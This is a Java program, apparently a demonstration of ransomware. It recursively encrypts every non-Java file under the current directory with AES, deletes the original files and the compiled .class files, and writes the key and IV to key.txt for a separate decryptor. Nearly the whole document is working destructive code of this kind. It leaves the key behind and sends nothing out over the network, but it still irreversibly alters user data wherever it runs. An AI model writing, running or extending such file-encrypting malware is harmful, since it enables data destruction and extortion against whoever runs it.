import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;
import java.security.SecureRandom;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Encrypt {

    private static final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    private static SecureRandom random = new SecureRandom();
    private static StringBuilder sbIV = new StringBuilder(16);
    private static StringBuilder sbKey = new StringBuilder(16);

    private static String IV = "encryptionIntVec";
    private static final String ALGORITHM = "AES/CBC/PKCS5Padding";
    private static byte[] IV_BYTES = IV.getBytes();
    private static String KEY = "0123456789abcdef";

    public static void main(String[] args) {
        for (int i = 0; i < 16; i++) {
            sbIV.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }
        for (int i = 0; i < 16; i++) {
            sbKey.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }
        KEY = sbKey.toString();
        IV = sbIV.toString();
        IV_BYTES = IV.getBytes();

        File folder = new File(".");
        processFolder(folder);

        System.out.println("Every non java file in the directory is encrypted.");
        System.out.println("Encryption key and the initialization vector is stored in the key.txt file.");
        System.out.println("If you don't touch the key.txt file and run the decryptor in the same folder it will automatically decrypt every file in the directory.");
    }


    public static void processFolder(File folder) {
        File[] files = folder.listFiles();
        for (File file : files) {
            if (file.isFile() && !file.getName().endsWith(".java") && !file.getName().endsWith(".class")) {
                encryptFile(file);

            }
            if (file.isDirectory()) {
                processFolder(file);
            }
            if(file.getName().endsWith(".class"))
                file.delete();
        }
    }

    public static void encryptFile(File file) {
        try {
            Key key = new SecretKeySpec(KEY.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(IV_BYTES));

            FileInputStream inputStream = new FileInputStream(file);
            byte[] inputBytes = new byte[(int) file.length()];
            inputStream.read(inputBytes);

            byte[] outputBytes = cipher.doFinal(inputBytes);

            String outputFilepath = file.getAbsolutePath() + ".encrypted";
            FileOutputStream outputStream = new FileOutputStream(outputFilepath);
            outputStream.write(Base64.getEncoder().encode(outputBytes));
            outputStream.close();
            inputStream.close();

            System.out.println("File encrypted: " + file.getAbsolutePath());
            file.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
        File key = new File("key.txt");
        try {
            key.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            FileWriter myWriter = new FileWriter("key.txt");
            myWriter.write("String, key: " + KEY + "\nIV: " + IV);
            myWriter.write("\nByte(Base64), key: " + Base64.getEncoder().encodeToString(KEY.getBytes()) + "\nIV: " + Base64.getEncoder().encodeToString(IV.getBytes()));
            myWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}